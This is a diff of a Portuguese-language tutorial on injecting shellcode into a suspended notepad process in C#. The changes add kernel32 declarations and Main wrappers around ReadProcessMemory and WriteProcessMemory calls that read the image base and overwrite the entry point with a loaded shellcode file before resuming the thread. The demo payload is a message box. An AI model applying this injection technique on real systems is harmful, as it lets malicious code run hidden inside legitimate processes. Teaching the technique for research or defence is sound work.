@@ -197,19 +197,31 @@ Console.WriteLine($"... Process ImageBaseAddress: 000000{ImageBaseAddress.ToStri
 Agora, a próxima etapa é calcular alguns valores dos cabeçalhos do PE. Primeiramente, é necessário ter o endereço base completo do executável carregado. Para isso, precisamos ler a região de memória correspondente ao `ImageBaseAddress`. Este valor será armazenado na variável `ImageAddress`.
 
 ```csharp
-byte[] arrayOne = new byte[0x8]
-bool getImageBase = ReadProcessMemory(
-	pi.hProcess,
-	ImageBaseAddress,
-	arrayOne,
-	arrayOne.Length,
-	IntPtr.Zero
+[DllImport("kernel32.dll", SetLastError = true)]
+static extern bool ReadProcessMemory(
+	IntPtr hProcess,
+	IntPtr lpBaseAddress,
+	[Out] byte[] lpBuffer,
+	int dwSize,
+	IntPtr lpNumberOfBytesRead
 );
 
-if (getImageBase == true)
+static void Main()
 {
-	IntPtr ImageAddress = (IntPtr)(BitConverter.ToInt64(arrayOne, 0));
-	Console.WriteLine($". Base Address: 000000{ImageAddress.ToString("X")}");
+	byte[] arrayOne = new byte[0x8]
+	bool getImageBase = ReadProcessMemory(
+		pi.hProcess,
+		ImageBaseAddress,
+		arrayOne,
+		arrayOne.Length,
+		IntPtr.Zero
+	);
+
+	if (getImageBase == true)
+	{
+		IntPtr ImageAddress = (IntPtr)(BitConverter.ToInt64(arrayOne, 0));
+		Console.WriteLine($". Base Address: 000000{ImageAddress.ToString("X")}");
+	}
 }
 ```
 
@@ -288,17 +300,32 @@ IntPtr EntrypointAddressPtr = (IntPtr)((UInt64)ImageAddress + entrypointRVA);
 Por fim, chegamos à região de memória onde iremos sobrescrever com o nosso shellcode. Essa área, anteriormente, era responsável por armazenar o "conteúdo" do notepad. Agora que está esvaziada, podemos utilizá-la para nossas operações. Para isso, empregaremos a API "WriteProcessMemory".
 
 ```csharp
-byte[] buf = File.ReadAllBytes("msgbox64.bin"); // shellcode
-
-bool writeMemBool = WriteProcessMemory(
-	pi.hProcess, // handle do processo
-	EntrypointAddressPtr, // VA do EP
-	buf, // shellcode
-	buf.Length, // tamanho do shellcode
-	out IntPtr bytesWritten // quantos bytes foram escritos
+[DllImport("kernel32.dll", SetLastError = true)]
+	private static extern bool WriteProcessMemory(
+	IntPtr hProcess,
+	IntPtr lpBaseAddress,
+	byte[] lpBuffer,
+	Int32 nSize,
+	out IntPtr lpNumberOfBytesWritten
 );
 
-if (writeMemBool == true) ResumeThread(pi.hThread);
+[DllImport("kernel32.dll", SetLastError = true)]
+static extern uint ResumeThread(IntPtr hThread);
+
+static void Main()
+{
+	byte[] buf = File.ReadAllBytes("msgbox64.bin"); // shellcode
+
+	bool writeMemBool = WriteProcessMemory(
+		pi.hProcess, // handle do processo
+		EntrypointAddressPtr, // VA do EP
+		buf, // shellcode
+		buf.Length, // tamanho do shellcode
+		out IntPtr bytesWritten // quantos bytes foram escritos
+	);
+
+	if (writeMemBool == true) ResumeThread(pi.hThread);
+}
 ```
 
 Como mostrado no código acima, passamos o handle do processo recém-criado como o primeiro argumento, e, seguidamente, a região de memória que será sobrescrita, que corresponde ao endereço de entrada (EP) do executável (PE).
